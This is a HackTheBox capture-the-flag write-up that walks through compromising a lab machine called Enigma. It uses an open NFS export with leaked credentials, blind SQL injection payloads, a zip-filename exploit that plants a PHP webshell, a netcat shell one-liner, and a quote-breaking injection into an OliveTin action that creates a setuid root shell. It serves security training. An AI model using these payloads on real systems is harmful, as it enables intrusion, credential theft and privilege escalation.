---
title: "HTB Enigma Writeup: From an NFS Leak to Root via OliveTin"
date: 2026-07-08 00:00:00 +0800
categories: [CTF, HackTheBox]
tags: [HackTheBox, SQLi, RCE, NFS, Roundcube, OliveTin, CTF]
---

# Target 10.129.26.76

## Network recon

### Rustscan

```bash
rustscan -a 10.129.26.76 --ulimit 5000 -g
```

```output
Open 10.129.26.76:22
Open 10.129.26.76:80
Open 10.129.26.76:110
Open 10.129.26.76:111
Open 10.129.26.76:143
Open 10.129.26.76:995
Open 10.129.26.76:993
Open 10.129.26.76:35373
Open 10.129.26.76:40535
Open 10.129.26.76:47293
Open 10.129.26.76:57917
Open 10.129.26.76:59239
```

```
10.129.26.76 -> [22,80,110,111,143,993,995,2049,35373,40535,47293,57917,59239]
```

### Nmap

```bash
nmap -sT -A -Pn -T5 -p 22,80,110,111,143,993,995,2049,35373,40535,47293,57917,59239 10.129.26.76 --disable-arp-ping --min-rtt-timeout 50ms --max-rtt-timeout 100ms
```

```
22/tcp    open     ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://enigma.htb/
110/tcp   open     pop3     Dovecot pop3d
| ssl-cert: Subject: commonName=enigma
111/tcp   open     rpcbind  2-4 (RPC #100000)
| rpcinfo:
|   100003  3,4         2049/tcp   nfs
|   100005  1,2,3      57917/tcp   mountd
|   100021  1,3,4      40535/tcp   nlockmgr
|   100024  1          35373/tcp   status
|_  100227  3           2049/tcp   nfs_acl
143/tcp   open     imap     Dovecot imapd (Ubuntu)
993/tcp   open     ssl/imap Dovecot imapd (Ubuntu)
995/tcp   filtered pop3s
2049/tcp  open     nfs_acl  3 (RPC #100227)
47293/tcp open     mountd   1-3 (RPC #100005)
59239/tcp open     mountd   1-3 (RPC #100005)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

A lot of ports, but most of it is just rpcbind spreading mountd and nlockmgr across random high ports. What actually matters here is: ssh, http, the Dovecot mail stack, and NFS. The SSL cert on Dovecot gives away the hostname too: `enigma`.

## Services, going one by one

- `22` — ssh, leaving it alone for now, nothing to brute force yet
- `80` — nginx, redirects to `enigma.htb`, so this needs a hosts entry and some vhost fuzzing
- `110/143/993` — Dovecot, commonName `enigma`
- `111/2049` — rpcbind pointing at an NFS share, worth checking exports before anything else
- the filtered/weird high ports are just rpc service ports, not separate attack surface

NFS with an open export list is usually too easy to pass up, so that's where I started.

## Web

```bash
whatweb http://enigma.htb
```

```
http://enigma.htb [200 OK] Country[RESERVED][ZZ], Email[support@enigma.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)], IP[10.129.26.76], Script, Title[Enigma Corp — Managed IT Solutions], nginx[1.24.0]
```

Plain nginx, nothing obviously outdated. Started a vhost fuzz in the background while I checked NFS.

```bash
ffuf -u http://enigma.htb -w /usr/share/wordlists/Seclists/Discovery/DNS/subdomains-top1million-110000.txt -fc 404 -H "HOST:FUZZ.enigma.htb" -fs 154
```

## NFS

```bash
showmount -e 10.129.26.76
```

```
Export list for 10.129.26.76:
/srv/nfs/onboarding *
```

Wide open to everyone, so I mounted it straight away.

```bash
sudo mount -t nfs 10.129.26.76:/srv/nfs/onboarding ./
```

```
-rw-r--r-- 1 root root 1751 Feb 19 20:53 New_Employee_Access.pdf
```

One PDF sitting there, clearly meant as an onboarding doc for a new hire. Opening it gave me a new vhost to add to my hosts file, `mail001`, plus a working credential pair:

<img width="781" height="732" alt="image" src="https://github.com/user-attachments/assets/b0b9e074-cb2a-41c2-8d58-22a780ff42d2" />


```
username: kevin
password: Enigma2024!
```

That's the kind of thing NFS exports should never leak, but here we are.

## Webmail

`http://mail001.enigma.htb/` turned out to be Roundcube Webmail 1.6.16. Logging in with kevin's creds dropped me into his inbox, which had a message from Sarah in Accounts.

### Checking Roundcube itself first

<img width="1076" height="349" alt="image" src="https://github.com/user-attachments/assets/80319193-8759-4c08-9487-d97ee65f50a9" />


Before touching the inbox content, I checked the Roundcube version against known issues, since 1.6.16 rang a bell:

- CVE-2026-48842: pre-auth SQL injection in the `virtuser_query` plugin via a `preg_replace()` backslash escape bypass
- CVE-2017-16651: an older file disclosure bug, not applicable to this version but worth knowing about

Enabled plugins on this instance were just the defaults (archive, filesystem_attachments, jqueryui, zipdownload), nothing custom that would open another angle. 
Given the webmail access I already had, I didn't need the SQLi, reading mail directly was faster.

### Reading the mail

Going through kevin's inbox, there was a message from Sarah that looked worth chasing. Given this was an IT-themed box, password reuse between the two accounts seemed like a reasonable first guess, and it worked, Sarah's account was reachable with the same credentials pattern.

Inside Sarah's inbox was an IT support email:

```
Hi Sarah,

Apologies for the delay. I have provisioned your access. Please find the details below:

URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s

Note: I will create a dedicated account for you shortly, for now you can use the admin account to get started.

Regards,
IT Support
Enigma Corp
```

Another vhost, another admin credential. At this point the box was basically handing me a trail of breadcrumbs through internal email, which is realistic but also very convenient.

## OpenSTAManager
<img width="700" height="570" alt="image" src="https://github.com/user-attachments/assets/2b234d79-5511-4c2c-ae27-00712c456e2c" />

`support_001.enigma.htb` turned out to be OpenSTAManager 2.9.8. Logging in as admin confirmed the version, and a quick check against known issues for that version turned up two relevant ones:

- CVE-2026-24415: reflected XSS in invoice/order/contract modification modals, the `righe` GET parameter gets echoed into an HTML attribute without sanitization
- An unauthenticated time-based blind SQL injection with amplified DoS potential, affecting versions before 2.9.8

The XSS wasn't useful here since I already had admin access, so the SQLi was the one worth confirming, mostly to understand how deep the input validation issues went in this app.

```bash
curl -c /tmp/cookies.txt -X POST 'http://support_001.enigma.htb/index.php?op=login' \
  -d 'username=admin&password=Ne3s4rtars78s'
```

```bash
time curl -s -b /tmp/cookies.txt \
  'http://support_001.enigma.htb/ajax_search.php?term=%22%20AND%200%20OR%20SLEEP(1)%20OR%20%22'
```

Confirmed, the response took the extra second.

```bash
curl -s -b /tmp/cookies.txt \
  'http://support_001.enigma.htb/ajax_search.php?term=%22%20AND%20SUBSTRING(DATABASE(),1,1)=%27o%27%20AND%20(SELECT%201%20FROM%20(SELECT(SLEEP(2)))a)%20OR%20%221%22=%221"' \
  > /dev/null
```

That confirmed the injection was real and workable, but since I already had full admin access through the panel, the actual way in was a known RCE advisory for this version rather than blind SQLi extraction:

[GHSA-25fp-8w8p-mx36](https://github.com/devcode-it/openstamanager/security/advisories/GHSA-25fp-8w8p-mx36)

### Getting code execution

The advisory abuses how the app names files inside an uploaded zip. A crafted filename can break out of the expected `.p7m` extension handling and get the app to execute a shell command during extraction, which I used to drop a PHP webshell.

```python
import zipfile

cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'

with zipfile.ZipFile('exploit.zip', 'w') as zf:
    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
```
<img width="1903" height="754" alt="image" src="https://github.com/user-attachments/assets/cb73b8b3-921e-4ca3-a658-0805593dcfeb" />

Uploaded the zip through the panel, and the webshell landed where expected.

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Getting a real shell

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=whereis+nc"
```

```
nc: /usr/bin/nc /usr/share/man/man1/nc.1.gz
```

Good, `nc` was available, so a standard fifo reverse shell would work.

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 4444 > /tmp/f
```

URL-encoded it for the GET parameter:

```bash
cat pay.txt | sed -r 's\ \+\g'
```

```
rm+-f+/tmp/f;+mkfifo+/tmp/f;+cat+/tmp/f+|+/bin/sh+-i+2>&1+|+nc+-l+0.0.0.0+4444+>+/tmp/f
```

While I had the webshell, I also checked the app's own config file, since this kind of PHP app usually keeps DB credentials in plaintext nearby:

```bash
curl "http://support_001.enigma.htb/files/SHELL.php?c=cat+../config.inc.php"
```

```
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
```

That password didn't map to brollin directly, but checking `/etc/passwd` style info on the box pointed at a local user `haris`, and the same password worked there:

```
haris:Fri3nds@9099
```

## Getting a user shell and the flag

```bash
su haris
```

```bash
whoami
```

```
haris
```

```bash
id
```

```
uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
```

```bash
cd /home && ls
```

```
haris  it  kevin  sarah
```

```bash
cd haris && ls
```

```
mail  user.txt
```

```bash
cat user.txt
```

```
5828cee***********************
```

User flag captured.

## Privilege escalation

First check, the obvious one:

```bash
sudo -l
```

```
[sudo] password for haris:
Sorry, user haris may not run sudo on enigma
```

No sudo rights for haris, so that door was shut. Time to enumerate what's actually running on the box instead of relying on sudo misconfigurations.

Looking through running processes, one caught my eye because it was owned by root but clearly reachable from a low-privilege context:

```bash
ps -ef | grep 1440
```

```
root  1440  1  0 17:41 ?  00:00:00 /usr/local/bin/OliveTin
```

OliveTin is a lightweight web UI that exposes shell commands as clickable actions, and critically, it's often deployed with weaker
auth than people assume. Worth checking its config before anything else, since misconfigured local-auth services tend to be the quiet way into a lot of these boxes.

```bash
cat /etc/OliveTin/config.yaml 2>/dev/null
```

The relevant bit:

```yaml
authRequireGuestsToLogin: false

authLocalUsers:
  enabled: true
#  users:
#    - username: alice
#      usergroup: admins
#      password: "$argon2id$..."
```

`authRequireGuestsToLogin: false` means unauthenticated requests are allowed to interact with the service at all,
no login wall in front of it. That alone is the whole vulnerability, everything after this is just finding the right action to abuse.

Scrolling through the configured actions, one stood out immediately because it runs a shell command built from user-supplied arguments:

```yaml
- title: Backup Database
  id: backup_database
  shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
  arguments:
    - name: db_user
      type: ascii_identifier
    - name: db_pass
      type: password
    - name: db_name
      type: ascii_identifier
```

`db_pass` gets dropped straight into a shell string wrapped only in single quotes. That's classic command injection bait,
break out of the quote and whatever comes after runs as the OliveTin process, which is owned by root.

Before injecting anything though, I needed the action's real API identifier rather than guessing. 
OliveTin's frontend talks to a ConnectRPC gateway, and the dashboard endpoint exposes each action's `bindingId`, which doubles as the `actionId` used when actually triggering it:

```bash
curl -s http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/GetDashboard \
  -H 'Content-Type: application/json' \
  --data '{}' \
  | jq '.. | objects | select(.title? == "Backup Database") | .action'
```

```json
{
  "bindingId": "backup_database",
  "title": "Backup Database",
  "canExec": true,
  "arguments": [
    {"name": "db_user", "type": "ascii_identifier", "defaultValue": "backup_svc"},
    {"name": "db_pass", "type": "password"},
    {"name": "db_name", "type": "ascii_identifier", "defaultValue": "production"}
  ]
}
```

`canExec: true` on a request that never authenticated is the confirmation this is triggerable by anyone who can reach the local API.
With the `bindingId` in hand, rather than trying to smuggle an interactive shell through this API directly, the cleaner move is dropping a setuid copy of bash somewhere writable:

```bash
actionId='backup_database'
cmd="install -m 4755 /bin/bash /tmp/.bs"

cat > /tmp/backdoor.json <<JSON
{
  "actionId": "$actionId",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "x' ; $cmd ; #"},
    {"name": "db_name", "value": "production"}
  ]
}
JSON

curl -s -X POST \
  -H 'Content-Type: application/json' \
  --data @/tmp/backdoor.json \
  http://127.0.0.1:1337/api/olivetin.api.v1.OliveTinApiService/StartAction
```

```json
{"logEntry":{"datetimeStarted":"2026-07-08 22:12:02","actionTitle":"Backup Database","output":"mysqldump: [Warning] Using a password on the command line interface can be insecure.\nUsage: mysqldump [OPTIONS] database [tables]\n...","timedOut":false,"exitCode":0,"user":"guest","executionFinished":true,"bindingId":"backup_database"}}
```

`mysqldump` itself failed, as expected, since the fake password broke its syntax, but that was never the point. 
The injected `install` command ran before the semicolon split the line, so the setuid binary was already in place regardless of what `mysqldump` did with the rest.

Running `/tmp/.bs` directly would just give a normal shell as haris again, since bash drops privileges back to the real UID by default. 
The `-p` flag is what tells it to keep running as the effective UID set by the setuid bit instead:

```bash
/tmp/.bs -p
```

```
.bs-5.2# whoami
root
```

Root.

## Takeaways

The whole chain here was really a chain of trust assumptions nobody double-checked: an NFS export open to the world, a PDF left inside it with real credentials, password reuse between two separate internal apps, and finally an internal automation tool left reachable without authentication because "it's only on localhost" isn't the same thing as "it's only reachable by someone who should be using it."
